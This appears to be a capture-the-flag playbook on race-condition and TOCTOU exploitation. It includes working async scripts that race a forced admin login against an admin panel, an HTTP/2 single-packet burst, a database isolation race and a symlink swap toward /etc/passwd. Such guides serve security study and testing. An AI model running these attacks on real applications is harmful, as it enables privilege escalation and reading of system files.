## Race Condition / TOCTOU Playbook

### Step 0 — Identify the race window from source
Look for sequences like:
1. **Set state → expensive operation → check state**: pbkdf2/bcrypt/sleep between two reads
2. **Check then act**: `if balance >= cost: balance -= cost` (classic TOCTOU)
3. **Server-side session reads/writes interleaved** with another request
4. **`READ UNCOMMITTED` isolation** in MySQL — exposes uncommitted writes to concurrent readers
5. **File operations**: `if os.path.exists(...): os.unlink(...)` between two PIDs

The race window is the time between the "T" (check) and "U" (use). For pbkdf2 with 100,000 iterations, the window is ~100ms. For bcrypt cost=12, ~300ms. Plenty for HTTP races.

### Step 1 — Map the gadget

For each candidate route, write down:
- What state is changed (session field, DB row, file)
- What expensive operation creates the window (pbkdf2, bcrypt, network call, sleep)
- What the privileged check looks like (`if user.is_admin`, `if balance >= 0`)

**Common Flask + flask-session + SQLAlchemy pattern**:
```python
session['username'] = request.form['username']            # write 1
session['password_hash'] = pbkdf2(...)                    # write 2 — SLOW
verify_session()                                          # raises if wrong
```
Between write 1 and write 2, `session['username']` may already be flushed to the server-side session store. A concurrent request using the same session cookie will see `username='admin'` while `password_hash` still matches the old (legitimate) value.

### Step 2 — Single-packet / parallel-burst attack

Use `aiohttp` or `httpx.AsyncClient` to fire many concurrent requests sharing the same session cookie. The Python stdlib `requests` is sync — too slow.

```python
import asyncio, aiohttp

URL = "http://TARGET"
COOKIE = "session=COOKIE_FROM_LEGITIMATE_LOGIN"

async def attempt(session, i):
    # Slow request: triggers pbkdf2 with admin username
    if i == 0:
        async with session.post(f"{URL}/login",
            data={"username": "admin", "password": "x"*100},
            headers={"Cookie": COOKIE}) as r:
            return ("login", r.status, await r.text())
    # Fast race: try to view admin page during the window
    else:
        async with session.get(f"{URL}/admin_panel",
            headers={"Cookie": COOKIE}) as r:
            t = await r.text()
            return ("read", r.status, t)

async def main():
    conn = aiohttp.TCPConnector(limit=200)
    async with aiohttp.ClientSession(connector=conn) as s:
        tasks = [attempt(s, i) for i in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    for tag, status, body in results:
        if "FLAG{" in body or "flag{" in body or (tag == "read" and status == 200 and "Only" not in body):
            print(tag, status, body[:500])

asyncio.run(main())
```

### Step 3 — Single-packet attack (h2 / HTTP/2)

Modern bypass for "request fan-out" gating: send N requests as one TCP packet using HTTP/2 multiplexing. Burp Repeater has "Send group in parallel (single connection)" — for scripting use `h2`/`hyper` or Turbo Intruder.

```python
# Using `httpx` HTTP/2:
import httpx, asyncio
async def fire():
    async with httpx.AsyncClient(http2=True) as c:
        await asyncio.gather(*[c.get("https://target/buy?item=flag") for _ in range(20)])
asyncio.run(fire())
```

### Step 4 — Database-level races
If `SQLALCHEMY_ENGINE_OPTIONS = {'isolation_level': 'READ UNCOMMITTED'}` (very loose), concurrent reads see uncommitted writes. Combine with a slow-write transaction:
- One worker: `UPDATE users SET is_admin=1 WHERE username='attacker'` inside a slow transaction
- Other worker: reads `User.query.filter_by(username='attacker').first().is_admin` while the txn is open
- The reader sees `is_admin=1` even though the txn is later rolled back

For tx-rollback patterns: trigger the slow transaction by including a deliberate error AFTER the privileged write but inside the same `db.session`.

### Step 5 — Filesystem races
If the app does `if not os.path.exists(target): os.symlink(...)` or `open(name, 'w')` after a check:
```python
# Symlink swap race
import os, threading
def swap():
    while True:
        try: os.unlink('/tmp/x'); os.symlink('/etc/passwd', '/tmp/x')
        except: pass
threading.Thread(target=swap, daemon=True).start()
# Then trigger the vulnerable HTTP call repeatedly
```

### Step 6 — Validate the win
Race wins are noisy — print every `FLAG{` you see and **dedupe by full body hash** to confirm the flag isn't from a non-race code path. Keep the burst size small (10–50) initially; ramp only if needed.

### Common Mistakes
- **Using `requests` (sync)**: races need parallelism — use `aiohttp` / `asyncio` / threads
- **Single attempt**: a race is a probability — fire 20+ attempts, not 1
- **Wrong cookie/session**: ALL parallel requests must share the SAME session/cookie that was put in the vulnerable state
- **Not reading the response body**: a successful race may return 200 with the flag inline — check every response, not just status
- **Skipping single-packet attacks**: for ms-window races, single-packet via HTTP/2 multiplexing is the only reliable trigger
